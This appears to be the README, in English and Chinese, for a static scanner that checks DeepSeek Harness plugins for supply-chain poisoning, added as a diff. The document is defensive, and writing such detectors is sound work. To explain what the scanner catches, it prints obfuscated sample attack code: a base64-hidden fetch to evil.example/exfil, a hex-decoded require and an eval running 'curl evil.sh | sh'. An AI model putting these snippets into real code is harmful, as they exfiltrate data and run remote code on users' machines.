@@ -1,0 +1,127 @@
+<h1>dsh-poison-guard</h1>
+<p>Pre-install supply-chain <strong>poison scanner</strong> for DeepSeek Harness plugins. It is
+not a toy regex grep: it runs three layers on every plugin before you <code>dsh plugin add</code> it —</p>
+<ol>
+<li><strong>AST analysis</strong> via <a href="https://github.com/NodeSecure/js-x-ray">NodeSecure JS-X-Ray</a>
+(the SAST used by NodeSecure CLI): variable tracing, dynamic-import resolution,
+obfuscator detection, <code>eval</code>/<code>Function</code>/<code>vm</code> sinks, <code>data-exfiltration</code>,
+<code>serialize-environment</code>, unsafe shell commands, and more.</li>
+<li><strong>Deobfuscation decoder</strong> that unpacks <code>atob()</code>, <code>Buffer.from(..., "base64"/"hex")</code>,
+<code>String.fromCharCode(...)</code>, and <code>\xNN</code> / <code>\uNNNN</code> escapes, then re-scans the decoded
+strings for hidden credentials, URLs, and shell commands.</li>
+<li><strong>Regex heuristics</strong> as a fallback for obvious literals, non-code files, and
+install-time scripts (<code>prepare</code> / <code>postinstall</code> / <code>install</code> / <code>preinstall</code>).</li>
+</ol>
+<h2>The honest threat model</h2>
+<p>No static tool can catch <strong>all</strong> poisoning. Detecting arbitrary malicious behavior in
+arbitrary code is undecidable (Rice's theorem); a determined attacker can always craft
+an obfuscation this scanner cannot see through. What this tool does is make the cheap,
+high-volume attacks — hidden exfiltration URLs, obfuscated <code>require("child_process")</code>,
+<code>eval</code> of base64 blobs, <code>process.env</code> harvests, <code>.ssh</code> reads, install-time <code>curl ... | sh</code> —
+visible to someone who would never find them by reading source. It is <strong>defense-in-depth,
+not a security boundary</strong>.</p>
+<p>The real boundary is the harness sandbox: keep untrusted plugins in <code>workspace-write</code>,
+never <code>danger-full-access</code>. The last layer is provenance: prefer verified, maintained,
+clearly-authored plugins.</p>
+<h2>What it detects</h2>
+<table>
+<thead>
+<tr>
+<th>Severity</th>
+<th>Examples</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>HIGH</td>
+<td><code>ast/data-exfiltration</code>, <code>ast/unsafe-import</code> (obfuscated require), <code>ast/unsafe-stmt</code> (eval/Function/vm), <code>ast/unsafe-command</code>, <code>deobfuscated-secret</code>, <code>deobfuscated-key</code>, <code>deobfuscated-command</code>, <code>exfil-combo</code>, credential references, private-key paths</td>
+</tr>
+<tr>
+<td>MEDIUM</td>
+<td><code>ast/serialize-environment</code>, <code>ast/shady-link</code>, <code>ast/sql-injection</code>, <code>ast/monkey-patch</code>, <code>ast/prototype-pollution</code>, <code>deobfuscated-url</code>, network egress, <code>child_process</code>, install-time scripts</td>
+</tr>
+<tr>
+<td>LOW</td>
+<td><code>ast/encoded-literal</code>, <code>ast/short-identifiers</code>, <code>ast/unsafe-regex</code>, <code>ast/crypto.weak-algorithm</code>, <code>env-read</code>, base64 obfuscation</td>
+</tr>
+</tbody></table>
+<p>Rules are prefixed by layer: <code>ast/*</code> (JS-X-Ray), <code>deobfuscated-*</code> (decoder),
+<code>install-script*</code> (manifest), and unprefixed (regex fallback).</p>
+<h2>Usage</h2>
+<pre><code># human-readable verdict
+dsh-poison-guard scan ./some-plugin
+
+# machine-readable (for CI gates)
+dsh-poison-guard scan ./some-plugin --json
+
+# install into a profile (then the agent gains a `plugin_scan` tool)
+dsh plugin --profile web add github:zoahdev/dsh-poison-guard
+</code></pre>
+<p>Exit code: <code>0</code> = CLEAN, <code>1</code> = at least one finding (wire it as a CI gate).</p>
+<h3>Example</h3>
+<pre><code>🔴 MALICIOUS  8 high / 5 medium / 4 low finding(s)
+engine: AST(js-x-ray) + deobfuscation + regex | 1 source file(s), 3 AST warning(s), 3 decoded fragment(s)
+
+[HIGH] ast/unsafe-import  index.js:6
+       obfuscated or untraceable import (require/import of a computed value)
+[HIGH] deobfuscated-url  index.js:3
+       decoded obfuscated URL: https://evil.example/exfil
+[HIGH] exfil-combo  (whole plugin):0
+       reads credentials/secrets AND makes network requests - the classic exfiltration shape
+</code></pre>
+<h3>CI gate</h3>
+<pre><code>- run: pnpm install --frozen-lockfile
+- run: dsh-poison-guard scan ./my-plugin --json
+</code></pre>
+<p>The scanner is synchronous and dependency-light at runtime (AST engine is pure
+JavaScript, no native modules).</p>
+<h2>Why AST + deobfuscation beats a regex scanner</h2>
+<p>A regex scanner misses everything below because there is no literal string to match:</p>
+<pre><code>const lib = Buffer.from("6673", "hex").toString()      // "fs"
+const fs = require(lib)                                  // -&gt; ast/unsafe-import
+
+const target = atob("aHR0cHM6Ly9ldmlsLmV4YW1wbGUvZXhmaWw=") // "https://evil.example/exfil"
+await fetch(target)                                      // -&gt; deobfuscated-url
+
+const cmd = String.fromCharCode(99,117,114,108)          // "curl"
+eval("execSync('" + cmd + " evil.sh | sh')")             // -&gt; deobfuscated-command + ast/unsafe-stmt
+</code></pre>
+<h2>Limitations</h2>
+<ul>
+<li>Static only — does not execute the plugin or observe runtime behavior.</li>
+<li>Obfuscation can be made undecidable; stronger obfuscators (e.g. <code>javascript-obfuscator</code>
+with string-array + control-flow flattening) may still hide the payload.</li>
+<li>The AST layer is tuned to <code>aggressive</code> sensitivity for maximum visibility; a benign
+plugin that does real <code>eval</code>/<code>child_process</code> work will also be flagged.</li>
+<li>No sandbox policy is enforced here; pair it with the harness sandbox.</li>
+</ul>
+<h2>Development</h2>
+<pre><code>pnpm install --frozen-lockfile
+pnpm typecheck
+pnpm build
+pnpm test
+</code></pre>
+<p>MIT license. Community template — not an official DeepSeek product.</p>
+<hr>
+<h1>dsh-poison-guard（中文）</h1>
+<p>DeepSeek Harness 插件的<strong>安装前投毒扫描器</strong>。不是正则 grep，而是在 <code>dsh plugin add</code> 之前跑三层检测：</p>
+<ol>
+<li><strong>AST 分析</strong>（<a href="https://github.com/NodeSecure/js-x-ray">NodeSecure JS-X-Ray</a>，NodeSecure CLI 同款 SAST）：变量追踪、动态 import 解析、混淆器识别、<code>eval</code>/<code>Function</code>/<code>vm</code>、数据外发、<code>process.env</code> 序列化、危险 shell 命令等。</li>
+<li><strong>反混淆解码器</strong>：解开 <code>atob()</code>、<code>Buffer.from(...,"base64"/"hex")</code>、<code>String.fromCharCode(...)</code>、<code>\xNN</code>/<code>\uNNNN</code> 转义，再对解出来的字符串二次扫描隐藏的密钥、URL、shell 命令。</li>
+<li><strong>正则兜底</strong>：覆盖明显字面量、非代码文件、以及 <code>prepare</code>/<code>postinstall</code>/<code>install</code>/<code>preinstall</code> 安装脚本。</li>
+</ol>
+<h2>老实说边界</h2>
+<p>任何静态工具都无法拦住<strong>所有</strong>投毒（Rice 定理，不可判定）。它拦住的是大量低成本攻击：隐藏的外发 URL、混淆的 <code>require("child_process")</code>、base64 <code>eval</code>、<code>process.env</code> 收割、读 <code>.ssh</code>、安装脚本 <code>curl ... | sh</code>。它是纵深防御，不是安全边界。真正的边界是 harness 沙箱：未验证插件永远别开 <code>danger-full-access</code>；最后一层是来源信誉。</p>
+<h2>用法</h2>
+<pre><code>dsh-poison-guard scan ./some-plugin
+dsh-poison-guard scan ./some-plugin --json   # 接 CI 门禁
+dsh plugin --profile web add github:zoahdev/dsh-poison-guard
+</code></pre>
+<p>退出码：<code>0</code> = CLEAN，<code>1</code> = 有发现。装进 dsh 后，agent 会多一个 <code>plugin_scan</code> 工具，可扫任意插件目录。</p>
+<h2>为什么比纯正则强</h2>
+<p>正则抓不到下面这些（因为没有可直接匹配的字面量）：</p>
+<pre><code>const lib = Buffer.from("6673", "hex").toString()  // "fs"
+const fs = require(lib)                            // -&gt; ast/unsafe-import
+const target = atob("aHR0cHM6Ly9ldmlsLmV4YW1wbGUvZXhmaWw=")
+await fetch(target)                                // -&gt; deobfuscated-url
+</code></pre>
+<p>MIT 许可。社区模板，非 DeepSeek 官方产品。</p>
